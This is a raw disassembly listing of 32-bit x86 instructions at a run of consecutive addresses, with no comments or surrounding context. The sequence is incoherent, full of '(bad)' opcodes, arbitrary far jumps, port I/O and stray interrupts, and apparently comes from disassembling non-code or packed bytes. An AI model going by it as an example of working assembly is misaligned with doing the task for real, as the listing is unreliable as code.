  4207f3:	xchg   esp,eax
  4207f4:	push   0x9b6f911b
  4207f9:	mov    cl,0x3
  4207fb:	stc    
  4207fc:	push   ss
  4207fd:	rcr    ebp,0x3f
  420800:	jmp    0xd0fd:0x268b04f8
  420807:	leave  
  420808:	or     edi,esi
  42080a:	ins    BYTE PTR es:[edi],dx
  42080b:	pop    ebx
  42080c:	ds pushf 
  42080e:	add    al,BYTE PTR [edx-0x6dfea601]
  420814:	push   es
  420815:	test   DWORD PTR [esi+0x26],0x6a51d925
  42081c:	inc    esi
  42081d:	jmp    0x4207a6
  42081f:	xor    edx,esi
  420821:	sahf   
  420822:	retf   
  420823:	inc    esp
  420824:	cwde   
  420825:	sbb    DWORD PTR [ebx],edi
  420827:	xor    cl,BYTE PTR ds:0xf938d8f1
  42082d:	(bad)  
  42082f:	xor    eax,0x28494440
  420834:	punpckhdq mm4,mm0
  420837:	fld    TBYTE PTR [eax+0x21d1883a]
  42083d:	mov    bl,0x55
  42083f:	lock cmp eax,0xd6ebef72
  420845:	dec    esp
  420846:	(bad)  
  420848:	add    ah,bh
  42084a:	fnstcw WORD PTR ds:0x1feb14fb
  420850:	sti    
  420851:	fisubr DWORD PTR [ecx-0x2894f2f0]
  420857:	jo     0x4208ce
  420859:	xchg   DWORD PTR [eax+0xc0ddf5f],ebx
  42085f:	(bad)  
  420860:	push   cs
  420861:	lea    ebp,[ebx+0x6d588d23]
  420867:	fst    QWORD PTR ss:[edx]
  42086a:	or     bh,BYTE PTR [esi+0x582e2301]
  420870:	fs jbe 0x4208ce
  420873:	sahf   
  420874:	cmp    dl,bh
  420876:	ffree  st(6)
  420878:	nop
  420879:	cmp    BYTE PTR ds:0xba695815,dh
  42087f:	jmp    0x16c2:0x115f1ebb
  420886:	adc    al,0x53
  420888:	dec    esi
  420889:	push   esi
  42088a:	pop    ebx
  42088b:	lds    ebx,FWORD PTR [eax]
  42088d:	data16 (bad) 
  42088f:	bound  esi,QWORD PTR [esi-0x45b57bd4]
  420895:	sub    al,0x93
  420897:	clc    
  420898:	xchg   cl,dl
  42089a:	mov    edi,0x1845ae6c
  42089f:	sbb    al,0xbd
  4208a1:	xchg   edi,eax
  4208a2:	cmp    dl,BYTE PTR [edx+0x198ec7d1]
  4208a8:	xchg   esp,eax
  4208a9:	pop    ebx
  4208aa:	(bad)  
  4208ab:	or     al,0x31
  4208ad:	int    0x58
  4208af:	xor    cl,BYTE PTR [esi]
  4208b1:	sahf   
  4208b2:	test   edx,0xc3ae1ff1
  4208b8:	cmp    cl,BYTE PTR [eax+0x3b]
  4208bb:	mul    BYTE PTR [ebx-0x7ff29ca0]
  4208c1:	cmp    ecx,esp
  4208c3:	cmc    
  4208c4:	arpl   WORD PTR [edi],dx
  4208c6:	push   ecx
  4208c7:	outs   dx,BYTE PTR ds:[esi]
  4208c8:	push   edi
  4208c9:	stc    
  4208ca:	popf   
  4208cb:	adc    dl,0xb0
  4208ce:	sub    eax,0x2ca80cee
  4208d3:	adc    bl,BYTE PTR [esi]
  4208d5:	add    edi,DWORD PTR [edx-0xd2d744e]
  4208db:	mov    eax,ds:0xcf77c49c
  4208e0:	popa   
  4208e1:	push   ebp
  4208e2:	push   cs
  4208e3:	aad    0x4b
  4208e5:	add    eax,0xb2a51a50
  4208ea:	or     cl,BYTE PTR [ebx-0x4b]
  4208ed:	cwde   
  4208ee:	stos   BYTE PTR es:[edi],al
  4208ef:	stc    
  4208f0:	pop    ds
  4208f1:	pop    eax
  4208f2:	inc    ecx
  4208f3:	xchg   ebx,eax
  4208f4:	pop    edx
  4208f5:	arpl   WORD PTR [ebx],si
  4208f7:	mov    DWORD PTR [esi-0x3405fb3b],edx
  4208fd:	xor    al,0xaf
  4208ff:	in     al,0x8a
  420901:	dec    eax
  420902:	or     BYTE PTR [esi],cl
  420904:	cmp    al,0xb4
  420906:	push   esp
  420907:	inc    esp
  420908:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42090a:	cmp    esp,esp
  42090c:	cld    
  42090d:	jg     0x420959
  42090f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420910:	sbb    al,0x97
  420912:	lock jo 0x4208b0
  420915:	adc    ecx,DWORD PTR [ebp+0x61]
  420918:	je     0x420965
  42091a:	inc    esi
  42091b:	pushf  
  42091c:	je     0x420930
  42091e:	stos   BYTE PTR es:[edi],al
  42091f:	je     0x42093c
  420921:	rcr    BYTE PTR [ebp-0xe],cl
  420924:	mov    eax,0xcbf574a0
  420929:	test   DWORD PTR [ebp+0x182a4949],edx
  42092f:	jno    0x420939
  420931:	add    BYTE PTR [ebx],bh
  420933:	shl    DWORD PTR [ebx+0x67],0x8
  420937:	xor    dl,BYTE PTR ds:0xac65a223
  42093d:	xchg   ecx,eax
  42093e:	jge    0x4208fb
  420940:	add    eax,0x3ba62e25
  420945:	cmp    edx,DWORD PTR [ecx]
  420947:	dec    edi
  420948:	out    dx,eax
  420949:	in     al,0xff
  42094b:	sbb    ch,BYTE PTR [ebp+0x56d4f0de]
  420951:	fnstsw WORD PTR [edi-0x52]
  420954:	push   eax
  420955:	iret   
  420956:	jge    0x4208eb
  420958:	mov    edx,0x2fab46c6
  42095d:	mov    cl,0xba
  42095f:	mov    ds:0x22454375,al
  420964:	lea    ebp,[edx+edi*4-0x65bb1bda]
  42096b:	and    eax,ebx
  42096d:	mov    dl,0xf0
  42096f:	mov    al,ds:0xa0fe6018
  420974:	pop    edi
  420975:	sub    ebp,DWORD PTR [esi]
  420977:	push   es
  420978:	fs and ecx,DWORD PTR ds:[eax]
  42097c:	clc    
  42097d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42097e:	popa   
  42097f:	pop    ecx
  420980:	pop    ecx
  420981:	sbb    dh,BYTE PTR [esi+0x559d98bd]
  420987:	push   0xf6c851f1
  42098c:	or     esp,ebp
  42098e:	xchg   DWORD PTR [esi+0x36],eax
  420991:	dec    ebp
  420992:	outs   dx,BYTE PTR ds:[esi]
  420993:	cmp    ebp,DWORD PTR [edx-0x2746eeee]
  420999:	in     eax,0x2f
  42099b:	popa   
  42099c:	or     ecx,DWORD PTR [ebx-0xadebe7d]
  4209a2:	fild   DWORD PTR [edi+edi*8-0x2d]
  4209a6:	(bad)  
  4209a7:	out    dx,eax
  4209a8:	enter  0x6391,0x97
  4209ac:	lods   eax,DWORD PTR ds:[esi]
  4209ad:	inc    eax
  4209ae:	enter  0x94af,0x12
  4209b2:	jmp    0x4209da
  4209b4:	test   DWORD PTR [ecx-0x471f6ce6],ecx
  4209ba:	add    edi,ecx
  4209bc:	add    edx,ecx
  4209be:	imul   edx,edi
  4209c1:	mov    edi,DWORD PTR [ebp-0x8]
  4209c4:	mov    ebx,DWORD PTR [ebp-0x10]
  4209c7:	sub    ebx,edi
  4209c9:	jmp    0x420edb
  4209ce:	cmp    al,0x3c
  4209d0:	xlat   BYTE PTR ds:[ebx]
  4209d1:	enter  0xdbd7,0xcb
  4209d5:	int3   
  4209d6:	sub    DWORD PTR ds:0x5baf1db4,edx
  4209dc:	add    al,0xc7
  4209de:	adc    BYTE PTR [edi+edi*2+0x78],bl
  4209e2:	jae    0x420a60
  4209e4:	js     0x420a5e
  4209e6:	jb     0x4209a9
  4209e8:	adc    DWORD PTR [edx+0x49df9089],esi
  4209ee:	jns    0x420a46
  4209f0:	pop    edx
  4209f1:	mov    bh,0x9c
  4209f3:	mov    ds:0x26b1fc83,eax
  4209f8:	and    eax,0x28aaf9c3
  4209fd:	stos   DWORD PTR es:[edi],eax
  4209fe:	xchg   ebx,eax
  4209ff:	mov    esp,0x7810cf0f
  420a04:	ja     0x420a74
  420a06:	add    dl,BYTE PTR [eax+0x25]
  420a09:	popf   
  420a0a:	sub    BYTE PTR [edx+0x6f],bl
  420a0d:	iret   
  420a0e:	dec    ebp
  420a0f:	int3   
  420a10:	frstor [esi]
  420a12:	ret    0x1ac0
  420a15:	shr    BYTE PTR [ebp-0x46c75947],0x65
  420a1c:	xchg   ebp,eax
  420a1d:	out    dx,al
  420a1e:	pop    ebx
  420a1f:	test   al,0xba
  420a21:	mov    ecx,0x49cf5905
  420a26:	stos   BYTE PTR es:[edi],al
  420a27:	fldenv [esi-0x6bb2048f]
  420a2d:	adc    dh,BYTE PTR [esi-0x11]
  420a30:	mov    ebx,0x5c395f26
  420a35:	pop    edx
  420a36:	pushf  
  420a37:	inc    ecx
  420a38:	frstpm(287 only) 
  420a3a:	push   0x7f3943fd
  420a3f:	daa    
  420a40:	stc    
  420a41:	cmc    
  420a42:	bound  esp,QWORD PTR [eax-0x5b]
  420a45:	push   ds
  420a46:	pop    esi
  420a47:	cli    
  420a48:	mov    ch,0x25
  420a4a:	shr    BYTE PTR [ebx],0xc6
  420a4d:	call   0xc0fc8ebc
  420a52:	mov    edi,0x65fa10f8
  420a57:	inc    edx
  420a58:	push   0xcf1a6ffd
  420a5d:	xor    DWORD PTR ds:0x622a2d3b,0x33
  420a64:	mov    al,ds:0x9afed6ae
  420a69:	sahf   
  420a6a:	add    al,0x7c
  420a6c:	call   0x49ba:0xf4767e9b
  420a73:	int3   
  420a74:	imul   edx,DWORD PTR [edi+ebp*2],0xffffff80
  420a78:	xchg   DWORD PTR [esi+0x19],eax
  420a7b:	add    ebp,DWORD PTR ds:0x457896fb
  420a81:	sti    
  420a82:	jl     0x420a20
  420a84:	dec    ecx
  420a85:	shr    DWORD PTR [ecx],1
  420a87:	(bad)  
  420a88:	sub    eax,0xd6561040
  420a8d:	out    dx,al
  420a8e:	mov    edx,0x43efed1c
  420a93:	rol    DWORD PTR [ecx-0x3f],1
  420a96:	daa    
  420a97:	or     ebx,DWORD PTR [ecx+ebx*1]
  420a9a:	clc    
  420a9b:	mov    ebp,0x18658962
  420aa0:	lock mov ds:0xedc28d8c,al
  420aa6:	(bad)  
  420aa7:	and    ch,BYTE PTR [edx+0x1b]
  420aaa:	std    
  420aab:	inc    eax
  420aac:	bound  edx,QWORD PTR [ecx+0x6018eebc]
  420ab2:	popa   
  420ab3:	fist   DWORD PTR [edi+0x39]
  420ab6:	adc    bl,bl
  420ab8:	(bad)  
  420ab9:	mov    edi,DWORD PTR [ebx-0x69]
  420abc:	mov    BYTE PTR [ecx],ah
  420abe:	sub    eax,0x6fe18041
  420ac3:	push   edi
  420ac4:	inc    esp
  420ac5:	stos   DWORD PTR es:[edi],eax
  420ac6:	fld    QWORD PTR [edi+0x53c6980c]
  420acc:	add    al,0x4c
  420ace:	adc    eax,0x176cdd67
  420ad3:	cld    
  420ad4:	xor    ebp,DWORD PTR [esi+0x3]
  420ad7:	mov    esi,DWORD PTR [esi+esi*8+0x67]
  420adb:	add    eax,0x983d4ee6
  420ae0:	adc    eax,0x5d02cfab
  420ae5:	cdq    
  420ae6:	ror    DWORD PTR [ebx],1
  420ae8:	sbb    ch,dh
  420aea:	pop    eax
  420aeb:	sbb    ebx,DWORD PTR [ecx-0x197ca69]
  420af1:	fild   WORD PTR ds:0xfc6a4066
  420af7:	adc    dl,BYTE PTR gs:0xe869a895
  420afe:	retf   
  420aff:	inc    ebp
  420b00:	lds    esi,FWORD PTR [ebp+0x27]
  420b03:	inc    eax
  420b04:	add    al,0x43
  420b06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b07:	test   DWORD PTR [eax],edi
  420b09:	xor    al,BYTE PTR [ecx+0x16]
  420b0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b0d:	cmp    DWORD PTR [edx+eax*8-0xb8cf1fa],esp
  420b14:	repnz stc 
  420b16:	sar    BYTE PTR gs:[edi],0x6
  420b1a:	add    eax,edx
  420b1c:	cmc    
  420b1d:	call   FWORD PTR [edx-0x2c2d7061]
  420b23:	repz push ebp
  420b25:	mov    edx,0x2a1008e5
  420b2a:	adc    eax,0xe2fc9cfe
  420b2f:	xchg   ebx,eax
  420b30:	or     eax,0x36e43fd
  420b35:	cs dec edx
  420b37:	pop    ss
  420b38:	mov    edx,?
  420b3a:	cdq    
  420b3b:	stos   BYTE PTR es:[edi],al
  420b3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b3d:	jecxz  0x420ba7
  420b3f:	int    0x3b
  420b41:	mov    ds:0xc72011f2,al
  420b46:	mov    WORD PTR [ebx-0x7f],ss
  420b49:	xor    eax,0x52c33a35
  420b4e:	ss mov dl,0xc2
  420b51:	out    0x71,al
  420b53:	push   ebp
  420b54:	out    dx,al
  420b55:	repnz es stc 
  420b58:	gs mov al,0xc7
  420b5b:	cmc    
  420b5c:	lahf   
  420b5d:	repz mov ebp,0x2acfd458
  420b63:	call   0x72bd:0x37033108
  420b6a:	jne    0x420b38
  420b6c:	sbb    DWORD PTR [edi+edx*2-0x4d209716],eax
  420b73:	mul    BYTE PTR ss:[edx-0x13c88492]
  420b7a:	pop    esi
  420b7b:	and    DWORD PTR [edx+0x2b],ecx
  420b7e:	mov    ecx,0xbd2f5dc3
  420b83:	test   al,0xb0
  420b85:	sbb    ah,BYTE PTR [edi-0x2b5c6372]
  420b8b:	cmp    eax,0x875202fb
  420b90:	xor    eax,0xa64b0636
  420b95:	mov    esi,0xecb22567
  420b9a:	mov    eax,0x24193bd5
  420b9f:	pop    ebx
  420ba0:	clc    
  420ba1:	int    0xf9
  420ba3:	and    edi,esp
  420ba5:	inc    ecx
  420ba6:	mov    edx,0xc37b5e42
  420bab:	mov    bl,0x6a
  420bad:	je     0x420bd7
  420baf:	ss ja  0x420bec
  420bb2:	cdq    
  420bb3:	aaa    
  420bb4:	addr16 mov ch,0x5a
  420bb7:	jno    0x420b46
  420bb9:	ret    
  420bba:	ins    BYTE PTR es:[edi],dx
  420bbb:	xlat   BYTE PTR ds:[ebx]
  420bbc:	lock jbe 0x420ba6
  420bbf:	jecxz  0x420b6c
  420bc1:	lock xchg esi,eax
  420bc3:	inc    eax
  420bc4:	xchg   esi,eax
  420bc5:	or     edi,DWORD PTR [eax-0x2e]
  420bc8:	pop    ds
  420bc9:	int    0x4c
  420bcb:	jecxz  0x420b60
  420bcd:	xor    eax,DWORD PTR [edi-0x1f1add35]
  420bd3:	sbb    ebx,DWORD PTR [ebx]
  420bd5:	ins    BYTE PTR es:[edi],dx
  420bd6:	mov    edx,0xd3f3aa80
  420bdb:	jg     0x420bbe
  420bdd:	inc    ebx
  420bde:	jp     0x420bb3
  420be0:	dec    edx
  420be1:	mov    al,ds:0xd92fb348
  420be6:	repnz mov eax,0xb08ad2b8
  420bec:	jns    0x420b6e
  420bee:	enter  0xce68,0xc3
  420bf2:	enter  0xf759,0x2b
  420bf6:	fisttp WORD PTR [esi-0x7c]
  420bf9:	add    edx,DWORD PTR [esp+edi*1-0x22]
  420bfd:	dec    esi
  420bfe:	aam    0x6c
  420c00:	mov    esp,0xc4f0699f
  420c05:	inc    edx
  420c06:	(bad)  
  420c07:	mov    dh,0x6e
  420c09:	push   esp
  420c0a:	xchg   BYTE PTR [ecx-0x1d],dh
  420c0d:	stos   BYTE PTR es:[edi],al
  420c0e:	sahf   
  420c0f:	icebp  
  420c10:	add    BYTE PTR [edi+ecx*4],cl
  420c13:	sub    eax,0x6634b081
  420c18:	adc    cl,BYTE PTR [edx]
  420c1a:	fist   WORD PTR [ebx]
  420c1c:	test   al,0xa0
  420c1e:	repnz mov WORD PTR [ecx],fs
  420c21:	add    BYTE PTR [edi-0x69fc40],0x2a
  420c28:	xor    ecx,esi
  420c2a:	in     eax,dx
  420c2b:	shr    BYTE PTR [edi+0x41],0x4c
  420c2f:	sti    
  420c30:	call   FWORD PTR [edx-0x6b376c7e]
  420c36:	repnz xor eax,0x69a5b29e
  420c3c:	(bad)  
  420c3d:	dec    ebx
  420c3e:	call   0x1e7f074d
  420c43:	(bad)  
  420c44:	mov    esi,0x1ab1e061
  420c49:	dec    esp
  420c4a:	(bad)  
  420c4b:	sti    
  420c4c:	daa    
  420c4d:	mov    ?,WORD PTR [eax+0x1e]
  420c50:	cmp    eax,0xbef73768
  420c55:	push   esp
  420c56:	jne    0x420c01
  420c58:	addr16 (bad) 
  420c5a:	loopne 0x420c25
  420c5c:	imul   edx,DWORD PTR [esi],0x6
  420c5f:	mov    ebx,0x81aed93e
  420c64:	xor    BYTE PTR [edx+0x19],0xfc
  420c68:	mov    eax,0xaaf7ddef
  420c6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c6e:	lock icebp 
  420c70:	ja     0x420c7a
  420c72:	jp     0x420c52
  420c74:	(bad)  
  420c75:	iret   
  420c76:	mov    bl,BYTE PTR [eax+0x74605994]
  420c7c:	leave  
  420c7d:	rol    BYTE PTR [edx+0x6b],1
  420c80:	jg     0x420c5d
  420c82:	std    
  420c83:	fs jb  0x420ce1
  420c86:	pop    ss
  420c87:	sbb    DWORD PTR [ebx],esi
  420c89:	mov    esi,DWORD PTR [edi+0x58e2863b]
  420c8f:	mov    al,0xc9
  420c91:	mov    ecx,0x5e23a94d
  420c96:	sbb    al,BYTE PTR [eax-0x377c74b2]
  420c9c:	aad    0x3
  420c9e:	or     edi,DWORD PTR [ecx-0x5c]
  420ca1:	sbb    ebx,DWORD PTR [edx-0x67]
  420ca4:	iret   
  420ca5:	pop    ebx
  420ca6:	out    0x7c,eax
  420ca8:	je     0x420d07
  420caa:	(bad)  
  420cab:	outs   dx,BYTE PTR ds:[esi]
  420cac:	lea    eax,[ecx+0x2a]
  420caf:	adc    esp,esp
  420cb1:	pusha  
  420cb2:	cmp    eax,0x5458bdb6
  420cb7:	xchg   esp,eax
  420cb8:	sbb    DWORD PTR [esi-0x79],ebp
  420cbb:	sti    
  420cbc:	xchg   ebx,eax
  420cbd:	call   0xd4fac976
  420cc2:	out    0x79,eax
  420cc4:	push   ebx
  420cc5:	sub    DWORD PTR [ebx],edi
  420cc7:	inc    edi
  420cc8:	call   0xb4ffea34
  420ccd:	add    al,0xf6
  420ccf:	ins    DWORD PTR es:[edi],dx
  420cd0:	inc    esi
  420cd1:	pop    ebp
  420cd2:	out    0x76,eax
  420cd4:	loop   0x420d3b
  420cd6:	pop    edx
  420cd7:	int3   
  420cd8:	aaa    
  420cd9:	cld    
  420cda:	cwde   
  420cdb:	std    
  420cdc:	pop    ebp
  420cdd:	jg     0x420d50
  420cdf:	push   ecx
  420ce0:	pop    edi
  420ce1:	inc    eax
  420ce2:	inc    ebx
  420ce3:	cmp    al,0x1d
  420ce5:	arpl   WORD PTR [ebp-0x425a2961],bp
  420ceb:	jp     0x420d5d
  420ced:	xchg   edx,eax
  420cee:	xor    dl,al
  420cf0:	or     DWORD PTR [esi+0x35],esi
  420cf3:	popa   
  420cf4:	mov    ds:0x2eb0991f,eax
  420cf9:	add    dh,BYTE PTR [esi]
  420cfb:	fnstsw WORD PTR [eax-0x122c2959]
  420d01:	out    dx,al
  420d02:	add    DWORD PTR [edx],0x3d319bbf
  420d08:	and    DWORD PTR [ebp+eiz*4-0xd],eax
  420d0c:	inc    edx
  420d0d:	dec    edi
  420d0e:	(bad)
  420d11:	push   ds
  420d12:	mov    esi,0x3825d3aa
  420d17:	int3   
  420d18:	and    dl,BYTE PTR [ebx-0x578c286f]
  420d1e:	jg     0x420d53
  420d20:	jp     0x420cd0
  420d22:	ror    esi,0xc2
  420d25:	add    eax,0xf027836
  420d2a:	sbb    esp,edi
  420d2c:	int3   
  420d2d:	aas    
  420d2e:	xor    DWORD PTR [eax+0x5b4edfdc],esi
  420d34:	dec    ecx
  420d35:	add    bl,BYTE PTR [ebp+0x752070af]
  420d3b:	(bad)  
  420d3c:	xlat   BYTE PTR ds:[ebx]
  420d3d:	cmp    al,0x19
  420d3f:	into   
  420d40:	mov    edi,0x97a9cf5e
  420d45:	sbb    bl,BYTE PTR [esi]
  420d47:	(bad)  
  420d48:	jmp    0xfc381b33
  420d4d:	sahf   
  420d4e:	push   eax
  420d4f:	jns    0x420cfa
  420d51:	xor    eax,0xfd9324a0
  420d56:	push   esi
  420d57:	xor    DWORD PTR [edx+0x12],edx
  420d5a:	push   eax
  420d5b:	into   
  420d5c:	and    cl,dh
  420d5e:	pop    eax
  420d5f:	sbb    al,0xf9
  420d61:	test   DWORD PTR [ebp-0x32e674c2],ebp
  420d67:	pushf  
  420d68:	fild   WORD PTR [edi-0x1c]
  420d6b:	ja     0x420cf2
  420d6d:	cmp    eax,ecx
  420d6f:	out    dx,al
  420d70:	outs   dx,BYTE PTR ds:[esi]
  420d71:	mov    ecx,0x102c22bd
  420d76:	jp     0x420d65
  420d78:	xor    al,0x4f
  420d7a:	push   0x9351fbce
  420d7f:	xor    eax,DWORD PTR [edx]
  420d81:	xchg   ebx,eax
  420d82:	mov    DWORD PTR [eax+0x4f444370],esi
  420d88:	repz xchg esp,eax
  420d8a:	(bad)  
  420d8b:	rcr    BYTE PTR [edi+0x4359bbcd],cl
  420d91:	shl    DWORD PTR [eax+ecx*4],cl
  420d94:	stos   BYTE PTR es:[edi],al
  420d95:	aad    0x4f
  420d97:	mov    cl,0x6f
  420d99:	test   DWORD PTR [ecx+esi*4-0x21],ecx
  420d9d:	retf   0x6513
  420da0:	int3   
  420da1:	sub    ah,bh
  420da3:	adc    ah,dl
  420da5:	or     al,BYTE PTR [eax-0x7e5216bf]
  420dab:	fs mov ecx,0xe5afc54b
  420db1:	sbb    BYTE PTR [ecx-0x26],bl
  420db4:	cmp    dh,bh
  420db6:	addr16 sahf 
  420db8:	fisubr WORD PTR [esi+0x5e]
  420dbb:	add    BYTE PTR [ecx+0x71],cl
  420dbe:	pop    es
  420dbf:	test   BYTE PTR [ecx-0x5d4c4aff],0x82
  420dc6:	jns    0x420e11
  420dc8:	nop
  420dc9:	fwait
  420dca:	es popf 
  420dcc:	adc    ebp,DWORD PTR [ebp-0x29]
  420dcf:	xor    eax,0x87258ee1
  420dd4:	mov    ecx,0xf0c8488d
  420dd9:	cdq    
  420dda:	ficom  DWORD PTR [edi+0x30]
  420ddd:	or     ch,BYTE PTR [edi]
  420ddf:	jno    0x420e55
  420de1:	xchg   edx,eax
  420de2:	ins    BYTE PTR es:[edi],dx
  420de3:	add    eax,0x5d44dbdf
  420de8:	add    esi,DWORD PTR [edx+0x25]
  420deb:	inc    ebp
  420dec:	mov    dl,0xb6
  420dee:	xchg   ecx,eax
  420def:	dec    edi
  420df0:	leave  
  420df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420df2:	or     DWORD PTR [ebx-0x28],esp
  420df5:	cmova  esp,DWORD PTR [ebp-0x1]
  420df9:	lea    esi,[ebx+0x5ee106ee]
  420dff:	add    eax,0x8984682c
  420e04:	dec    edi
  420e05:	(bad)  
  420e06:	push   ss
  420e07:	sbb    al,0xef
  420e09:	call   0x71276029
  420e0e:	jne    0x420e69
  420e10:	xor    ah,BYTE PTR [eax-0xb]
  420e13:	xchg   ebp,eax
  420e14:	add    eax,ebp
  420e16:	dec    eax
  420e17:	sahf   
  420e18:	hlt    
  420e19:	and    bl,BYTE PTR [ebx-0x2ce51a0e]
  420e1f:	stos   BYTE PTR es:[edi],al
  420e20:	sub    bh,BYTE PTR [ebx+eiz*2-0x67]
  420e24:	mov    BYTE PTR [ecx+0x67cb284f],0xcb
  420e2b:	pop    edi
  420e2c:	mov    cl,0xa4
  420e2e:	arpl   WORD PTR [eax+0x10],bx
  420e31:	push   esp
  420e32:	push   edi
  420e33:	adc    bl,BYTE PTR [eax+eax*1-0x32ebaa80]
  420e3a:	mov    ecx,0x5da51ea
  420e3f:	add    BYTE PTR [eax+0x6a],dh
  420e42:	(bad)  
  420e43:	xlat   BYTE PTR ds:[ebx]
  420e44:	aaa    
  420e45:	in     eax,dx
  420e46:	mov    ebx,0xe5241227
  420e4b:	push   0x570fef62
  420e50:	sub    BYTE PTR [ebx+0xa],0x1a
  420e54:	mov    esi,0x53c38ef5
  420e59:	aaa    
  420e5a:	mov    ebx,DWORD PTR [edx+0x663ed82f]
  420e60:	repnz sub BYTE PTR [ebp+0x29b24c58],al
  420e67:	sub    ebx,ecx
  420e69:	push   edi
  420e6a:	(bad)  
  420e6b:	in     eax,dx
  420e6c:	mov    ecx,0x962af12a
  420e71:	push   esi
  420e72:	stos   DWORD PTR es:[edi],eax
  420e73:	jle    0x420e47
  420e75:	lahf   
  420e76:	mov    ebp,DWORD PTR [esi]
  420e78:	xor    DWORD PTR ds:0x68e76760,ebp
  420e7e:	add    al,0x65
  420e80:	jae    0x420eea
  420e82:	and    ch,ch
  420e84:	stos   BYTE PTR es:[edi],al
  420e85:	inc    eax
  420e86:	lea    eax,ds:0x25e190df
  420e8c:	jns    0x420ecc
  420e8e:	sbb    BYTE PTR [edi-0x62],al
  420e91:	loopne 0x420f04
  420e93:	mov    esi,DWORD PTR [esi+0x3c6a90e7]
  420e99:	jp     0x420ec2
  420e9b:	jb     0x420e6f
  420e9d:	pop    ebx
  420e9e:	sbb    al,0xe8
  420ea0:	jbe    0x420ebd
  420ea2:	push   ecx
  420ea3:	inc    ebp
  420ea4:	in     eax,dx
  420ea5:	sbb    eax,0x2a86d5a2
  420eaa:	adc    BYTE PTR [ebp-0xe],ah
  420ead:	fnstenv [esi+0x7a7c9762]
  420eb3:	add    eax,0x9967d89e
  420eb8:	(bad)  
  420eb9:	(bad)  
  420eba:	lock cdq 
  420ebc:	mov    WORD PTR [ebx+0x5dbf678c],?
  420ec2:	ds (bad) 
  420ec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ec5:	jp     0x420f07
  420ec7:	and    edx,0x3f
  420eca:	fstp   TBYTE PTR [eax+0x40]
  420ecd:	scas   eax,DWORD PTR es:[edi]
  420ece:	gs loop 0x420e93
  420ed1:	mul    BYTE PTR [esp+ecx*8]
  420ed4:	dec    ecx
  420ed5:	enter  0xa0c9,0xc3
  420ed9:	nop
  420eda:	and    al,0x3b
  420edc:	fimul  DWORD PTR [edi]
  420ede:	xchg   DWORD PTR [eax],ecx
  420ee0:	add    BYTE PTR [eax],al
  420ee2:	add    BYTE PTR [ebx+0x1fe9d055],cl
  420ee8:	sbb    DWORD PTR [eax],eax
  420eea:	add    BYTE PTR [ebx+0xde9c855],cl
  420ef0:	add    eax,0xc7c90000
  420ef5:	ror    bl,0xca
  420ef8:	retf   
  420ef9:	leave  
  420efa:	lds    esp,FWORD PTR [edi+0x4972f76f]
  420f00:	je     0x420f64
  420f02:	into   
  420f03:	or     esp,DWORD PTR [edi+0x7f]
  420f06:	js     0x420f7b
  420f08:	jl     0x420f82
  420f0a:	js     0x420eab
  420f0c:	add    eax,0x94ea28ac
  420f11:	pop    ss
  420f12:	pop    ds
  420f13:	sub    ch,BYTE PTR [esi+0x42c1344c]
  420f19:	fcomp  st(4)
  420f1b:	and    ebp,ebx
  420f1d:	out    dx,al
  420f1e:	lods   eax,DWORD PTR ds:[esi]
  420f1f:	pushf  
  420f20:	in     al,0xc1
  420f22:	push   edi
  420f23:	leave  
  420f24:	pop    ebp
  420f25:	add    BYTE PTR ds:0x602f8060,dl
  420f2b:	sub    cl,dl
  420f2d:	push   esp
  420f2e:	mov    cl,0xf1
  420f30:	jno    0x420f05
  420f32:	pop    ebx
  420f33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f34:	lock imul DWORD PTR [edx-0x4b]
  420f38:	and    eax,0xfd943792
  420f3d:	xor    edx,DWORD PTR [edi*1-0x46e3962c]
  420f44:	not    BYTE PTR [esi+ebp*1-0x58]
  420f48:	out    0x5e,al
  420f4a:	mov    ebx,0x8ed8eec2
  420f4f:	jno    0x420eec
  420f51:	inc    ecx
  420f52:	out    dx,al
  420f53:	ja     0x420fab
  420f55:	sbb    eax,0xe8e97165
  420f5a:	xchg   edx,eax
  420f5b:	push   edi
  420f5c:	ins    BYTE PTR es:[edi],dx
  420f5d:	inc    ebx
  420f5e:	call   0x85c8b316
  420f63:	adc    DWORD PTR [ecx+ebx*2],ecx
  420f66:	fnstenv [edi+0x151274bd]
  420f6c:	sbb    edi,DWORD PTR [ecx-0x28]
  420f6f:	data16 cld 
  420f71:	ja     0x420f83
  420f73:	sar    BYTE PTR [ebx+0x4],cl
  420f76:	push   ebp
  420f77:	jmp    0x420f21
  420f79:	dec    eax
  420f7a:	aas    
  420f7b:	fiadd  DWORD PTR [ecx+0x7c8968e5]
  420f81:	out    0xcf,eax
  420f83:	popa   
  420f84:	pop    ss
  420f85:	(bad)
  420f88:	mov    edi,eax
  420f8a:	push   0x71a7ded0
  420f8f:	or     DWORD PTR [edi+0x52de8657],ecx
  420f95:	nop
  420f96:	std    
  420f97:	ss cwde 
  420f99:	addr16 mov ebx,0x6e39a369
  420f9f:	cs mov dl,0xd
  420fa2:	inc    edx
  420fa3:	stc    
  420fa4:	imul   edx,esi,0xffffffa2
  420fa7:	mov    DWORD PTR [ecx+0x4228975],esi
  420fad:	mov    ch,0x1e
  420faf:	inc    ebp
  420fb0:	lea    edi,[esi]
  420fb2:	push   0x79
  420fb4:	add    bh,BYTE PTR [ecx+0x17]
  420fb7:	sub    DWORD PTR [esi-0x5a],ebx
  420fba:	adc    BYTE PTR [esp+eax*8-0x1f00c0db],al
  420fc1:	sub    eax,0x72f52bf7
  420fc6:	loope  0x420fae
  420fc8:	sahf   
  420fc9:	push   esp
  420fca:	leave  
  420fcb:	mov    cl,0xdb
  420fcd:	out    dx,al
  420fce:	jg     0x42104d
  420fd0:	jp     0x420ffd
  420fd2:	in     eax,dx
  420fd3:	xchg   ebp,eax
  420fd4:	mov    esi,0x795cf41f
  420fd9:	ss mov edx,0xbaf1c913
  420fdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fe0:	shl    DWORD PTR [edx-0x7fe327b0],cl
  420fe6:	or     eax,0xce9f8b60
